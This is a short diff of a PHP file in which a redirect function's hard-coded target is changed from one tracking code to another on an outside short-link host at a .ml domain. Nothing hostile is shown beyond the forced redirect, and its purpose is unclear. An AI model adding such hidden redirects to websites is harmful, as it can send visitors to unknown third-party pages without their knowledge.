@@ -26,7 +26,7 @@ function Redirect($url){
 
     }
 
-$url="https://hizlikisalt.ml/t.php?s=2606";
+$url="https://hizlikisalt.ml/t.php?s=8aa7";
 
   Redirect("$url");
 
